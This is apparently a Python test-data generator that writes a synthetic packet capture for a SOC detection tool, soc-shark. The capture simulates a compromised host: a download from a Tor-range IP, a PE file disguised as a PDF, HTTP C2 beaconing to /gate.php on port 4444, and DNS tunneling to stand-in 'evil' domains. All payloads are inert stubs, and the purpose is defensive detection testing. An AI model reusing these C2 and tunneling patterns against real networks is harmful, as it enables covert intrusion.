#!/usr/bin/env python3
"""
gen_demo_pcap.py — genera `examples/demo_soc_incident.pcap` para soc-shark.

Escenario SOC sintético (host víctima 192.168.1.50):
  1. Ruido benigno: ARP, NTP, mDNS, SSDP (para Smart Noise Dimming).
  2. Descarga de ejecutable por HTTP desde un rango Tor (IOC + carving MZ).
  3. Descarga de "factura.pdf" que en realidad es un PE (Masquerading T1036).
  4. C2 beaconing: HTTP POST /gate.php cada 10 s al puerto 4444
     (beaconing + port mismatch T1071).
  5. DNS tunneling: TXT queries de alta entropía hacia tunnel.evil.ru
     (T1071.004).

Solo usa la stdlib. Uso:
    python3 tools/gen_demo_pcap.py
"""
import struct
import sys
from datetime import datetime, timezone
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent

# ── Capa 2/3/4 ──────────────────────────────────────────────────────────────

def mac(s: str) -> bytes:
    return bytes.fromhex(s.replace(":", ""))

MAC_VICTIM = "aa:bb:cc:00:00:33"
MAC_GW = "aa:bb:cc:00:00:01"

def eth(src: str, dst: str, etype: int, payload: bytes) -> bytes:
    return mac(dst) + mac(src) + struct.pack("!H", etype) + payload

def ip4_checksum(header: bytes) -> int:
    total = 0
    for i in range(0, len(header), 2):
        total += (header[i] << 8) | header[i + 1]
    while total >> 16:
        total = (total & 0xFFFF) + (total >> 16)
    return (~total) & 0xFFFF

def ipv4(src: str, dst: str, proto: int, payload: bytes, ident: int) -> bytes:
    total = 20 + len(payload)
    hdr = bytearray()
    hdr += struct.pack("!BBHHHBBH", 0x45, 0, total, ident, 0x4000, 64, proto, 0)
    hdr += bytes(int(x) for x in src.split("."))
    hdr += bytes(int(x) for x in dst.split("."))
    ck = ip4_checksum(bytes(hdr))
    hdr[10:12] = struct.pack("!H", ck)
    return bytes(hdr) + payload

def tcp(src_ip: str, dst_ip: str, sport: int, dport: int, flags: int,
        payload: bytes = b"", seq: int = 1, ack: int = 1) -> bytes:
    seg = struct.pack("!HHIIBBHHH", sport, dport, seq, ack, 0x50, flags, 64240, 0, 0)
    return seg + payload  # checksum TCP a 0: el motor no lo verifica

def udp(sport: int, dport: int, payload: bytes) -> bytes:
    return struct.pack("!HHHH", sport, dport, 8 + len(payload), 0) + payload

# ── DNS ─────────────────────────────────────────────────────────────────────

def dns_name(name: str) -> bytes:
    out = b""
    for label in name.split("."):
        out += bytes([len(label)]) + label.encode()
    return out + b"\x00"

def dns_query(txid: int, qname: str, qtype: int = 1) -> bytes:
    hdr = struct.pack("!HHHHHH", txid, 0x0100, 1, 0, 0, 0)
    return hdr + dns_name(qname) + struct.pack("!HH", qtype, 1)

def dns_response(txid: int, qname: str, answers) -> bytes:
    """answers: lista de (tipo, ttl, rdata_bytes)"""
    hdr = struct.pack("!HHHHHH", txid, 0x8180, 1, len(answers), 0, 0)
    body = dns_name(qname) + struct.pack("!HH", 1, 1)
    for atype, ttl, rdata in answers:
        body += dns_name(qname) + struct.pack("!HHIH", atype, 1, ttl, len(rdata)) + rdata
    return hdr + body

def a_record(ip: str) -> bytes:
    return bytes(int(x) for x in ip.split("."))

def cname_record(target: str) -> bytes:
    return dns_name(target)

def txt_record(text: str) -> bytes:
    return bytes([len(text)]) + text.encode()

# ── Escritor pcap (LE, microsegundos) ───────────────────────────────────────

class PcapWriter:
    def __init__(self):
        self.buf = bytearray()
        self.buf += struct.pack("<IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 1)
        self.n = 0

    def add(self, ts_us: int, frame: bytes):
        sec = ts_us // 1_000_000
        usec = ts_us % 1_000_000
        self.buf += struct.pack("<IIII", sec, usec, len(frame), len(frame))
        self.buf += frame
        self.n += 1

    def save(self, path: Path):
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(self.buf)
        print(f"escrito {path} ({self.n} paquetes, {len(self.buf)} bytes)")

# ── Escenario ───────────────────────────────────────────────────────────────

VICTIM, GW = "192.168.1.50", "192.168.1.1"
TOR_IP = "185.220.101.4"      # rango Tor → IOC
CDN2_IP = "45.33.32.156"      # facturas "falsas"
C2_IP = "185.22.1.9"          # C2 demo
NTP_IP = "162.159.200.123"
MDNS = "224.0.0.251"
SSDP = "239.255.255.250"

T0 = int(datetime(2025, 6, 10, 8, 14, 0, tzinfo=timezone.utc).timestamp()) * 1_000_000

def main():
    w = PcapWriter()
    ident = [1]

    def ip(proto, payload, src, dst):
        ident[0] += 1
        return ipv4(src, dst, proto, payload, ident[0])

    def tcp_flow(ts, sport, dst, dport, exchanges):
        """exchanges: lista de (delta_us, flags, payload, origen)"""
        nonlocal w
        seq, ack = 1000, 2000
        t = ts
        # handshake
        w.add(t, eth(MAC_VICTIM, MAC_GW, 0x0800, ip(6, tcp(VICTIM, dst, sport, dport, 0x02, b"", seq), VICTIM, dst)))
        t += 300
        w.add(t, eth(MAC_GW, MAC_VICTIM, 0x0800, ip(6, tcp(dst, VICTIM, dport, sport, 0x12, b"", seq=ack, ack=seq + 1), dst, VICTIM)))
        t += 200
        w.add(t, eth(MAC_VICTIM, MAC_GW, 0x0800, ip(6, tcp(VICTIM, dst, sport, dport, 0x10, b"", seq=seq + 1, ack=ack + 1), VICTIM, dst)))
        seq, ack = seq + 1, ack + 1
        for delta, flags, payload, sender in exchanges:
            t += delta
            if sender == "c":
                w.add(t, eth(MAC_VICTIM, MAC_GW, 0x0800, ip(6, tcp(VICTIM, dst, sport, dport, flags, payload, seq=seq, ack=ack), VICTIM, dst)))
                seq += len(payload)
            else:
                w.add(t, eth(MAC_GW, MAC_VICTIM, 0x0800, ip(6, tcp(dst, VICTIM, dport, sport, flags, payload, seq=ack, ack=seq), dst, VICTIM)))
                ack += len(payload)
        # cierre
        t += 200
        w.add(t, eth(MAC_VICTIM, MAC_GW, 0x0800, ip(6, tcp(VICTIM, dst, sport, dport, 0x11, b"", seq=seq, ack=ack), VICTIM, dst)))
        t += 200
        w.add(t, eth(MAC_GW, MAC_VICTIM, 0x0800, ip(6, tcp(dst, VICTIM, dport, sport, 0x11 | 0x10, b"", seq=ack, ack=seq + 1), dst, VICTIM)))

    # 1) Ruido benigno ─────────────────────────────────────────────────────
    w.add(T0 + 0, eth(MAC_VICTIM, "ff:ff:ff:ff:ff:ff", 0x0806,
                      struct.pack("!HHBBH", 1, 0x0800, 6, 4, 1) + mac(MAC_VICTIM) +
                      bytes(map(int, VICTIM.split("."))) + b"\x00" * 6 +
                      bytes(map(int, GW.split(".")))))
    w.add(T0 + 100_000, eth(MAC_GW, MAC_VICTIM, 0x0806,
                            struct.pack("!HHBBH", 1, 0x0800, 6, 4, 2) + mac(MAC_GW) +
                            bytes(map(int, GW.split("."))) + mac(MAC_VICTIM) +
                            bytes(map(int, VICTIM.split(".")))))
    w.add(T0 + 500_000, eth(MAC_VICTIM, MAC_GW, 0x0800,
                            ip(17, udp(53_530, 53, dns_query(0x1001, "www.pool.ntp.org")), VICTIM, NTP_IP)))
    w.add(T0 + 600_000, eth(MAC_GW, MAC_VICTIM, 0x0800,
                            ip(17, udp(53, 53_530, dns_response(0x1001, "www.pool.ntp.org", [(1, 300, a_record(NTP_IP))])), GW, VICTIM)))
    for i in range(2):
        w.add(T0 + 1_000_000 + i * 10_000_000, eth(MAC_VICTIM, MAC_GW, 0x0800,
               ip(17, udp(123, 123, b"\x1b" + b"\x00" * 47), VICTIM, NTP_IP)))
    w.add(T0 + 2_000_000, eth(MAC_VICTIM, "01:00:5e:00:00:fb", 0x0800,
           ip(17, udp(5353, 5353, dns_query(0, "_services._dns-sd._udp.local", 12)), VICTIM, MDNS)))
    ssdp = b"M-SEARCH * HTTP/1.1\r\nHost:239.255.255.250:1900\r\nMAN:\"ssdp:discover\"\r\nMX:1\r\nST:ssdp:all\r\n\r\n"
    w.add(T0 + 3_000_000, eth(MAC_VICTIM, "01:00:5e:7f:ff:fa", 0x0800,
           ip(17, udp(49_152, 1900, ssdp), VICTIM, SSDP)))

    # 2) Descarga de ejecutable desde rango Tor (IOC) ──────────────────────
    t = T0 + 10_100_000
    w.add(t, eth(MAC_VICTIM, MAC_GW, 0x0800, ip(17, udp(53_531, 53, dns_query(0x2001, "update.evil-cdn.ru")), VICTIM, GW)))
    w.add(t + 300_000, eth(MAC_GW, MAC_VICTIM, 0x0800, ip(17, udp(53, 53_531,
          dns_response(0x2001, "update.evil-cdn.ru",
                       [(5, 300, cname_record("cdn1.evil-cdn.ru")),
                        (1, 120, a_record(TOR_IP))])), GW, VICTIM)))
    exe = b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00" + b"\x41" * 600
    req = b"GET /update.exe HTTP/1.1\r\nHost: update.evil-cdn.ru\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
    res = (b"HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\n"
           b"Content-Length: " + str(len(exe)).encode() + b"\r\n\r\n" + exe)
    tcp_flow(T0 + 10_500_000, 49_812, TOR_IP, 80, [
        (400_000, 0x18, req, "c"),
        (500_000, 0x18, res, "s"),
    ])

    # 3) Masquerading: factura.pdf que es un PE ────────────────────────────
    t = T0 + 30_100_000
    w.add(t, eth(MAC_VICTIM, MAC_GW, 0x0800, ip(17, udp(53_532, 53, dns_query(0x2002, "factura.evil-cdn.ru")), VICTIM, GW)))
    w.add(t + 300_000, eth(MAC_GW, MAC_VICTIM, 0x0800, ip(17, udp(53, 53_532,
          dns_response(0x2002, "factura.evil-cdn.ru", [(1, 60, a_record(CDN2_IP))])), GW, VICTIM)))
    fake_pdf = b"MZ\x90\x00" + b"PE\x00\x00" + b"\x90" * 300
    req = b"GET /factura.pdf HTTP/1.1\r\nHost: factura.evil-cdn.ru\r\nUser-Agent: curl/8.5.0\r\n\r\n"
    res = (b"HTTP/1.1 200 OK\r\nContent-Type: application/pdf\r\n"
           b"Content-Length: " + str(len(fake_pdf)).encode() + b"\r\n\r\n" + fake_pdf)
    tcp_flow(T0 + 30_500_000, 49_815, CDN2_IP, 80, [
        (400_000, 0x18, req, "c"),
        (500_000, 0x18, res, "s"),
    ])

    # 4) C2 beaconing: POST /gate.php cada 10 s en el puerto 4444 ──────────
    t = T0 + 60_100_000
    w.add(t, eth(MAC_VICTIM, MAC_GW, 0x0800, ip(17, udp(53_533, 53, dns_query(0x2003, "c2.evil-domain.ru")), VICTIM, GW)))
    w.add(t + 300_000, eth(MAC_GW, MAC_VICTIM, 0x0800, ip(17, udp(53, 53_533,
          dns_response(0x2003, "c2.evil-domain.ru", [(1, 30, a_record(C2_IP))])), GW, VICTIM)))
    beacon = b"POST /gate.php HTTP/1.1\r\nHost: c2.evil-domain.ru\r\nUser-Agent: \r\nContent-Length: 12\r\n\r\ndGFza19pZA=="
    reply = b"HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: 8\r\n\r\nsleep=10"
    exch = []
    # Beacon exacto: 6 llamadas del cliente cada 10.000000 s (CV = 0).
    for i in range(6):
        if i > 0:
            exch.append((9_000_000, 0x10, b"", "c"))  # silencio hasta el próximo ciclo
        exch.append((400_000, 0x18, beacon, "c"))
        exch.append((600_000, 0x18, reply, "s"))
    tcp_flow(T0 + 60_500_000, 49_820, C2_IP, 4444, exch)

    # 5) DNS tunneling: TXT de alta entropía ───────────────────────────────
    t = T0 + 120_000_000
    for i, label in enumerate(["a7x9k2p1m4q8z5n3b6v1c3d5f7g9h1j3",
                               "z2x4v6n8m1q3w5e7r9t0y2u4i6o8p1a3s",
                               "k9j7h5g3f1d2s4a6z8x0c2v4b6n8m1q3w",
                               "e5r7t9y1u3i5o7p9a2s4d6f8g1h3j5k7l"]):
        w.add(t + i * 1_000_000, eth(MAC_VICTIM, MAC_GW, 0x0800,
               ip(17, udp(53_534 + i, 53, dns_query(0x3000 + i, f"{label}.tunnel.evil.ru", 16)), VICTIM, GW)))

    w.save(ROOT / "examples" / "demo_soc_incident.pcap")

    iocs = ROOT / "examples" / "iocs" / "sample_iocs.txt"
    iocs.write_text(
        "# soc-shark: lista de IOCs de ejemplo (IP, CIDR o dominio)\n"
        "# Uso: soc-shark read captura.pcap --iocs examples/iocs/sample_iocs.txt\n"
        "185.220.101.0/24      # Nodos de salida Tor (bloque demo)\n"
        "185.22.1.9            # C2 del escenario demo\n"
        "# 2001:db8:bad::/48   # ejemplo IPv6\n",
        encoding="utf-8")
    print(f"escrito {iocs}")


if __name__ == "__main__":
    sys.exit(main())
